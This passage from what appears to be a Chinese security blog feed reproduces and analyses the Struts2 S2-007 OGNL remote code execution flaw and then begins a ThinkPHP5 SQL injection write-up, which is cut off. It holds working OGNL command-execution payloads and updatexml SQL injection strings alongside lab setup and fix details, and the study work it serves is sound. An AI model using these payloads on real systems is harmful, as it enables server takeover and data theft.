<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code> 来校验参数名的合法性。</p><h2 id="4-Struts2-007"><a href="#4-Struts2-007" class="headerlink" title="4.Struts2-007"></a>4.Struts2-007</h2><h3 id="1-漏洞概要-2"><a href="#1-漏洞概要-2" class="headerlink" title="1.漏洞概要"></a>1.漏洞概要</h3><p>Struts2-007是一个远程代码执行漏洞。</p><p>影响版本： <strong>Struts 2.0.0 - Struts 2.2.3</strong> 。更多详情可参考官方通告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-007">https://cwiki.apache.org/confluence/display/WW/S2-007</a></p><p><strong>当出现转换错误时，用户输入被评估为OGNL表达式</strong></p><h3 id="2-漏洞环境搭建-2"><a href="#2-漏洞环境搭建-2" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h3><p>Tomcat 8.5.64 + Struts2.2.3</p><p>以下是漏洞复现的必备文件。</p><p>index.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: reader-l<br>  Date: <span class="hljs-number">2021</span>/<span class="hljs-number">6</span>/<span class="hljs-number">30</span><br>  Time: 上午<span class="hljs-number">8</span>:<span class="hljs-number">52</span><br>  To change <span class="hljs-keyword">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>  &lt;title&gt;S2-007&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;S2-007 Demo&lt;/h2&gt;<br>&lt;p&gt;link: &lt;a href=<span class="hljs-string">&quot;https://struts.apache.org/docs/s2-007.html&quot;</span>&gt;https:<span class="hljs-comment">//struts.apache.org/docs/s2-007.html&lt;/a&gt;&lt;/p&gt;</span><br><br>&lt;s:form action=<span class="hljs-string">&quot;login&quot;</span>&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;username&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;password&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;age&quot;</span> label=<span class="hljs-string">&quot;age&quot;</span> /&gt;<br>  &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.1&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>S2-007 Example<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- &lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;true&quot; /&gt; --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devMode&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br>    <span class="hljs-comment">&lt;!-- Add packages here --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;S2-007&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;action.LoginAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><span class="hljs-comment">&lt;!-- 这一行一定写入不然会报错--&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-漏洞复现-3"><a href="#3-漏洞复现-3" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>S2-007的利用场景比较苛刻，要求对提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成OGNL表达式的执行。</p><p>本地弹计算器验证POC：</p><figure class="highlight purebasic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs purebasic">&#x27; + (<span class="hljs-symbol">#_memberAccess</span>[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]=true,<span class="hljs-symbol">#foo</span>=new java.lang.Boolean(<span class="hljs-string">&quot;false&quot;</span>) ,<span class="hljs-symbol">#context</span>[<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]=<span class="hljs-symbol">#foo</span>,@java.lang.<span class="hljs-keyword">Runtime</span>@getRuntime().exec(<span class="hljs-string">&quot;deepin-calculator&quot;</span>)) + &#x27;<br></code></pre></td></tr></table></figure><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/55.png"></p><p>命令回显EXP：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala">&#x27; + (#_memberAccess[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="hljs-literal">true</span>,#foo=<span class="hljs-keyword">new</span> java.lang.<span class="hljs-type">Boolean</span>(<span class="hljs-string">&quot;false&quot;</span>) ,#context[<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]=#foo,<span class="hljs-meta">@org</span>.apache.commons.io.<span class="hljs-type">IOUtils</span><span class="hljs-meta">@toString</span>(<span class="hljs-meta">@java</span>.lang.<span class="hljs-type">Runtime</span><span class="hljs-meta">@getRuntime</span>().exec(<span class="hljs-symbol">&#x27;i</span>d&#x27;).getInputStream())) + &#x27;<br></code></pre></td></tr></table></figure><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/54.png"></p><h3 id="4-漏洞分析-3"><a href="#4-漏洞分析-3" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h3><p>通过查看官方关于漏洞的描述，可以发现漏洞是出现在<code>ConversionErrorInterceptor</code>这个处理类型转换错误的拦截器中</p><p><a href="https://issues.apache.org/jira/browse/WW-3668">https://issues.apache.org/jira/browse/WW-3668</a></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/56.png"></p><p>我们在这个拦截器的<code>intercept</code>方法中下个断点调试查看：</p><p>可以发现程序会将用户输入的值存入<code>fakie</code>变量，同时在存入之前，会将用户输入的值用<code>getOverrideExpr</code>方法来处理。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/57.png"></p><p>我们跟进<code>getOverrideExpr</code>方法：在 <strong>getOverrideExpr</strong> 方法中，会在用户输入的值两边拼接上单引号，然后再将值存入刚刚的 <strong>fakie</strong> 变量。这也是我们的payload两边加上单引号的原因—-&gt;闭合单引号。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/58.png"></p><p>接着程序会调用<code>setExprOberrides</code>方法把 <strong>fakie</strong> 变量存入 <strong>OgnlValueStack.overrides</strong> 变量中。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/59.png"></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/60.png"></p><p>然后在解析到 <code>Struts2</code> 结束标签时（<code>org.apache.struts2.views.jsp.ComponentTagSupport#doEndTag</code>），会将用户输入值经过 <code>OGNL</code> 执行并返回。如果先前 <code>OgnlValueStack.overrides</code> 存储过相关字段，则会先从 <code>OgnlValueStack.overrides</code> 中取出相关值，然后再通过 <code>OGNL</code> 执行，代码执行也就发生在此处。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/61.png"></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/62.png"></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/63.png"></p><h3 id="5-漏洞修复-2"><a href="#5-漏洞修复-2" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h3><p>​    版本struts2-2.2.3.1中利用<code>org.apache.commons.lang.StringEscapeUtils.escapeJava</code>过滤字符串,转义字符串,防止单引号逃逸.</p><h1 id="3-参考文章"><a href="#3-参考文章" class="headerlink" title="3.参考文章"></a>3.参考文章</h1><p><a href="https://www.freebuf.com/vuls/217482.html">https://www.freebuf.com/vuls/217482.html</a></p><h1 id="4-Struts2官方漏洞目录链接"><a href="#4-Struts2官方漏洞目录链接" class="headerlink" title="4.Struts2官方漏洞目录链接"></a>4.Struts2官方漏洞目录链接</h1><ul><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-001">S2-001</a> - 远程代码利用表单验证错误</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-002">S2-002</a> - &lt;s：url&gt;和&lt;s：a&gt;标记上的跨站点脚本（XSS）漏洞</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-003">S2-003</a> - XWork ParameterInterceptors旁路允许OGNL语句执行</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-004">S2-004</a> - 提供静态内容时的目录遍历漏洞</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-005">S2-005</a> - XWork ParameterInterceptors旁路允许远程命令执行</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-006">S2-006</a> - XWork中的多个跨站点脚本（XSS）生成错误页面</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-007">S2-007</a> - 当出现转换错误时，用户输入被评估为OGNL表达式</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-008">S2-008</a> - Struts2中的多个关键漏洞</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-009">S2-009</a> - ParameterInterceptor漏洞允许远程命令执行</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-010">S2-010</a> - 当使用Struts 2令牌机制进行CSRF保护时，可能会因滥用已知会话属性而绕过令牌检查</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-011">S2-011</a> - 长请求参数名称可能会显着提高DOS攻击的有效性</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-012">S2-012</a> - 展示应用程序漏洞允许远程命令执行</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-013">S2-013</a> - URL和锚标记的includeParams属性中存在的漏洞允许远程命令执行</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-014">S2-014</a> - 强制参数包含在URL和锚标记中引入的漏洞允许远程命令执行，会话访问和操作以及XSS攻击</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-015">S2-015</a> - 通配符匹配机制引入的漏洞或OGNL表达式的双重评估允许远程命令执行。</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-016">S2-016</a> - 通过操作前缀为“action：”/“redirect：”/“redirectAction：”的参数引入的漏洞允许远程命令执行</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-017">S2-017</a> - 通过操作前缀为“redirect：”/“redirectAction：”的参数引入的漏洞允许打开重定向</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-018">S2-018</a> - Apache Struts2中的访问控制漏洞</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-019">S2-019</a> - 默认情况下禁用动态方法调用</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-020">S2-020</a> - 将Commons FileUpload升级到版本1.3.1（避免DoS攻击）并添加’class’以排除ParametersInterceptor中的params（避免ClassLoader操作）</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-021">S2-021</a> - 改进了ParametersInterceptor和CookieInterceptor中被排除的参数，以避免ClassLoader操作</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-022">S2-022</a> - 在CookieInterceptor中扩展排除的params以避免操纵Struts的内部</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-023">S2-023</a> - 令牌的生成值可以预测</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-024">S2-024</a> - 错误的excludeParams会覆盖DefaultExcludedPatternsChecker中定义的那些</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-025">S2-025</a> - 调试模式和公开的JSP文件中的跨站点脚本漏洞</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-026">S2-026</a> - 特殊顶级对象可用于访问Struts的内部</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-027">S2-027</a> - TextParseUtil.translateVariables不过滤恶意OGNL表达式</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-028">S2-028</a> - 使用具有损坏的URLDecoder实现的JRE可能会导致基于Struts 2的Web应用程序中的XSS漏洞。</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-029">S2-029</a> - 在标记属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行。</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-030">S2-030</a> - <a href="https://cwiki.apache.org/confluence/display/WW/S2-030">I18NInterceptor中</a>可能的XSS漏洞</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-031">S2-031</a> - XSLTResult可用于解析任意样式表</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-032">S2-032</a> - 启用动态方法调用时，可以通过方法：前缀执行远程执行代码。</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-033">S2-033</a> - 使用REST插件时可以执行远程执行代码！启用动态方法调用时的运算符。</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-034">S2-034</a> - OGNL缓存中毒可能导致DoS漏洞</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-035">S2-035</a> - 动作名称清理容易出错</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-036">S2-036</a> - 在标签属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行（类似于S2-029）</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-037">S2-037</a> - 使用REST插件时可以执行远程执行代码。</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-038">S2-038</a> - 可以绕过令牌验证并执行CSRF攻击</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-039">S2-039</a> - Getter作为行动方法导致安全绕过</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-040">S2-040</a> - 使用现有默认操作方法输入验证绕过。</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-041">S2-041</a> - 使用URLValidator时可能发生DoS攻击</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-042">S2-042</a> - “公约”插件中可能的路径遍历</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-043">S2-043</a> - 在生产中使用Config Browser插件</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-044">S2-044</a> - 使用URLValidator时可能发生DoS攻击</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-045">S2-045</a> - 基于Jakarta Multipart解析器执行文件上载时可能的远程执行代码。</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-046">S2-046</a> - 基于Jakarta Multipart解析器执行文件上传时可能的RCE（类似于S2-045）</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-047">S2-047</a> - 使用URLValidator时可能发生DoS攻击（类似于S2-044）</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-048">S2-048</a> - Struts 2.3.x系列中Struts 1插件示例中的Struts Showcase应用程序中可能的RCE</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-049">S2-049</a> - DoS攻击可用于Spring安全操作</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-050">S2-050</a> - 使用URLValidator时的正则表达式拒绝服务（类似于S2-044和S2-047）</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-051">S2-051</a> - 远程攻击者可能在使用Struts REST插件时通过发送精心设计的xml请求来创建DoS攻击</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-052">S2-052</a> - 使用带有XStream处理程序的Struts REST插件处理XML有效负载时可能发生的远程代码执行攻击</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-053">S2-053</a> - 在Freemarker标记中使用无意表达而不是字符串文字时可能发生的远程执行代码攻击</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-054">S2-054</a> - 使用Struts REST插件时，可以使用精心设计的JSON请求执行DoS攻击</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-055">S2-055</a> - Jackson JSON库中的RCE漏洞</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-056">S2-056</a> - 使用Struts REST插件时，可以使用精心设计的XML请求执行DoS攻击</li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-057">S2-057</a> - 当alwaysSelectFullNamespace为true（由用户或插件如Convention Plugin）时可能执行远程代码执行，然后：结果使用没有命名空间，同时，其上层包没有或通配符名称空间，类似于结果，当使用没有值和动作集的url标记时，它的上层包没有或通配符命名空间。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    最近在学习JAVA安全，所以部分JAVA的相关框架漏洞自然就是我学习的重中之重，近几年Struts2各种RCE的漏</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Struts2、漏洞复现、代码审计" scheme="https://reader-l.github.io/tags/Struts2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞分析之SQL注入六</title>
    <link href="https://reader-l.github.io/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/"/>
    <id>https://reader-l.github.io/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/</id>
    <published>2021-06-13T03:38:13.000Z</published>
    <updated>2021-06-13T14:16:46.352Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h1><p>本次漏洞存在于所有 <strong>Mysql</strong> 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> 。</p><p>不同版本 <strong>payload</strong> 需稍作调整：</p><p><strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><strong>5.1.11～5.1.25</strong> ： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>) from users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h1 id="2-漏洞环境搭建"><a href="#2-漏洞环境搭建" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h1><p>通过以下命令获取测试环境代码：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer</span> <span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink</span>/<span class="hljs-string">think</span>=<span class="hljs-string">5</span>.<span class="hljs-string">1</span>.<span class="hljs-string">25</span> <span class="hljs-string">tpdemo1</span><br></code></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-string">&quot;require&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.6.0&quot;</span>,<br>    <span class="hljs-string">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.1.25&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure><p>然后执行 <code>composer update</code> ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$options</span> = request()-&gt;get(<span class="hljs-string">&#x27;options&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;max(<span class="hljs-variable">$options</span>);<br>        var_dump(<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。创建数据库信息如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 